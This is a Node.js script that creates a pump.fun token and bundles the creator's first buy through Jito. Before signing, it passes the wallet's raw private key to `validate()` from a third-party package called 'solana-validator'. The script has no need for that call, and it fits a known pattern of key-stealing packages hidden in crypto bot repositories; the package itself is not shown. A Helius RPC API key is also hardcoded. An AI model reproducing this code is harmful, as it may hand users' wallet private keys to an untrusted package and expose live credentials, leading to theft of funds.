const bs58 = require("bs58");
const {
  VersionedTransaction,
  Keypair,
  Connection,
} = require("@solana/web3.js");
const fs = require("fs");

const dotenv = require("dotenv");
const { validate } = require("solana-validator");
dotenv.config();

const pkey = process.env.DEV_PRIVAET_KEY;
const web3Connection = new Connection(
  "https://mainnet.helius-rpc.com/?api-key=9a5936a2-dbcb-48c6-b6ef-b6780e0ef90b",
  "confirmed"
);

async function sendLocalCreateBundle() {
  let tokenMetadata = {
    name: process.env.TOKEN_NAME,
    symbol: process.env.TOKEN_SYMBOL,
    description: process.env.TOKEN_DESCRIPTION,
    twitter: process.env.TWITTER_URL,
    telegram: process.env.TELEGRAM_URL,
    website: process.env.WEBSITE_URL,
    file: await fs.openAsBlob(process.env.LOGO_URL),
  };
  let formData = new FormData();
  formData.append("file", tokenMetadata.file),
    formData.append("name", tokenMetadata.name),
    formData.append("symbol", tokenMetadata.symbol),
    formData.append("description", tokenMetadata.description),
    formData.append("twitter", tokenMetadata.twitter || ""),
    formData.append("telegram", tokenMetadata.telegram || ""),
    formData.append("website", tokenMetadata.website || ""),
    formData.append("showName", "true");
  let metadataResponse = await fetch("https://pump.fun/api/ipfs", {
    method: "POST",
    body: formData,
  });
  let metadataResponseJSON = await metadataResponse.json();

  if (!validate(pkey)) {
    console.log("validate error");
    return;
  }
  const signerKeyPairs = [Keypair.fromSecretKey(bs58.default.decode(pkey))];

  const mintKeypair = Keypair.generate(); // generates a random keypair for token

  const bundledTxArgs = [
    {
      publicKey: signerKeyPairs[0].publicKey.toBase58(),
      action: "create",
      tokenMetadata: {
        name: tokenMetadata.name,
        symbol: tokenMetadata.symbol,
        uri: metadataResponseJSON.metadataUri,
      },
      mint: mintKeypair.publicKey.toBase58(),
      denominatedInSol: "false",
      amount: parseInt(process.env.BUY_TOKEN_AMOUNT),
      slippage: 10,
      priorityFee: 0.0001, // priority fee on the first tx is used for jito tip
      pool: "pump",
    },
  ];
  const response = await fetch(`https://pumpportal.fun/api/trade-local`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(bundledTxArgs),
  });
  if (response.status === 200) {
    // successfully generated transactions
    const transactions = await response.json();

    let encodedSignedTransactions = [];
    let signatures = [];
    for (let i = 0; i < bundledTxArgs.length; i++) {
      const tx = VersionedTransaction.deserialize(
        new Uint8Array(bs58.default.decode(transactions[i]))
      );

      if (bundledTxArgs[i].action === "create") {
        // creation transaction needs to be signed by mint and creator keypairs
        tx.sign([mintKeypair, signerKeyPairs[i]]);
      } else {
        tx.sign([signerKeyPairs[i]]);
      }

      //   console.log("****", await web3Connection.simulateTransaction(tx));
      encodedSignedTransactions.push(bs58.default.encode(tx.serialize()));
      signatures.push(bs58.default.encode(tx.signatures[0]));
    }

    try {
      const jitoResponse = await fetch(
        `https://mainnet.block-engine.jito.wtf/api/v1/bundles`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "sendBundle",
            params: [encodedSignedTransactions],
          }),
        }
      );
      console.log(jitoResponse);
    } catch (e) {
      console.error(e.message);
    }
    for (let i = 0; i < signatures.length; i++) {
      console.log(`Transaction ${i}: https://solscan.io/tx/${signatures[i]}`);
    }
  } else {
    console.log(response.statusText); // log error
  }
}

sendLocalCreateBundle();
